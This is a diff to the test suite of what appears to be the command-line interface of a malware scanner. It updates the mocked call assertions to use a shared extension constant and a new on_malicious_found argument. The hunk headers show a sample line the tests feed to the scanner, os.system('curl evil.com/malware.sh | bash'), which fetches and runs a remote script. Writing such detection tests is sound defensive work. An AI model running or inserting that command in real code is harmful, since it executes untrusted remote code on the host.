@@ -12,6 +12,7 @@ import os
 sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))
 
 from cli.entry import main
+from common.config import SUPPORTED_EXTENSIONS
 
 
 class TestBasicCLI:
@@ -59,10 +60,11 @@ class TestBasicCLI:
                         # Verify MalwiReport.create was called correctly
                         mock_process.assert_called_once_with(
                             input_path=test_file,
-                            accepted_extensions=["py", "js", "mjs", "cjs"],
+                            accepted_extensions=SUPPORTED_EXTENSIONS,
                             predict=True,
                             silent=True,
                             malicious_threshold=0.7,
+                            on_malicious_found=None,
                         )
 
                         # Verify result was called with demo output
@@ -296,10 +298,11 @@ os.system('curl evil.com/malware.sh | bash')
                         # Verify directory processing
                         mock_process.assert_called_once_with(
                             input_path=tmp_path,
-                            accepted_extensions=["py", "js", "mjs", "cjs"],
+                            accepted_extensions=SUPPORTED_EXTENSIONS,
                             predict=True,
                             silent=True,
                             malicious_threshold=0.7,
+                            on_malicious_found=None,
                         )
 
                         # Verify output contains directory info
@@ -352,10 +355,11 @@ os.system('curl evil.com/malware.sh | bash')
                         # Verify custom threshold was used
                         mock_process.assert_called_once_with(
                             input_path=test_file,
-                            accepted_extensions=["py", "js", "mjs", "cjs"],
+                            accepted_extensions=SUPPORTED_EXTENSIONS,
                             predict=True,
                             silent=True,
                             malicious_threshold=0.9,
+                            on_malicious_found=None,
                         )
 
                         # Verify result is good (below threshold)
@@ -404,6 +408,7 @@ os.system('curl evil.com/malware.sh | bash')
                             predict=True,
                             silent=True,
                             malicious_threshold=0.7,
+                            on_malicious_found=None,
                         )
 
     def test_cli_model_loading_error_continues(self, tmp_path):
